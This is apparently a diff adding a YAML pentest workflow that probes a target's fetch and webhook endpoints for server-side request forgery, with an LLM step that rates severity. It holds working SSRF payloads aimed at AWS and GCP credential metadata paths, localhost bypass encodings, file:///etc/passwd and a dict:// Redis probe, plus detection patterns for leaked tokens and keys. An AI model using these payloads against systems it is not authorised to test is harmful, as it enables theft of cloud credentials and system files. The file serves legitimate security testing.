@@ -1,0 +1,79 @@
+# Pentest: Server-Side Request Forgery (SSRF)
+# OWASP A10:2021
+id: pentest_ssrf
+name: SSRF Test
+version: "1.0.0"
+description: Test if server can be tricked into making internal requests
+
+steps:
+  - id: start
+    module: flow.start
+    label: Start
+    params: {}
+    orderIndex: 0
+
+  - id: ssrf_probes
+    module: http.batch
+    label: SSRF Payloads
+    params:
+      requests:
+        # Internal network
+        - method: GET
+          url: "{{target_url}}/api/fetch?url=http://127.0.0.1"
+        - method: GET
+          url: "{{target_url}}/api/fetch?url=http://localhost:8080"
+        - method: GET
+          url: "{{target_url}}/api/fetch?url=http://169.254.169.254/latest/meta-data/"
+        - method: GET
+          url: "{{target_url}}/api/fetch?url=http://metadata.google.internal/computeMetadata/v1/"
+        # Cloud metadata (GCP)
+        - method: GET
+          url: "{{target_url}}/api/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+          headers: { "Metadata-Flavor": "Google" }
+        # Cloud metadata (AWS)
+        - method: GET
+          url: "{{target_url}}/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+        # Bypass techniques
+        - method: GET
+          url: "{{target_url}}/api/fetch?url=http://0x7f000001"
+        - method: GET
+          url: "{{target_url}}/api/fetch?url=http://[::1]"
+        - method: GET
+          url: "{{target_url}}/api/fetch?url=http://127.1"
+        # Via redirect
+        - method: POST
+          url: "{{target_url}}/api/webhook"
+          headers: { "Content-Type": "application/json" }
+          body: '{"callback_url": "http://127.0.0.1:3000/admin"}'
+        # File protocol
+        - method: GET
+          url: "{{target_url}}/api/fetch?url=file:///etc/passwd"
+        - method: GET
+          url: "{{target_url}}/api/fetch?url=dict://127.0.0.1:6379/info"
+      detect_patterns:
+        - "ami-"
+        - "iam"
+        - "root:"
+        - "access_token"
+        - "private_key"
+        - "redis_version"
+    orderIndex: 1
+
+  - id: analyze
+    module: llm.agent
+    label: Analyze Results
+    params:
+      model: gpt-4o
+      prompt: |
+        Analyze SSRF test results: ${ssrf_probes.data}
+
+        CRITICAL if: cloud metadata accessible, internal services reachable, file:// protocol works
+        HIGH if: internal IPs respond differently than external
+        MODERATE if: bypass techniques partially work
+
+        Output JSON: { "findings": [...], "severity": "...", "cloud_exposure": true|false, "summary": "..." }
+    orderIndex: 2
+
+edges:
+  - { source: start, target: ssrf_probes }
+  - { source: ssrf_probes, target: analyze }
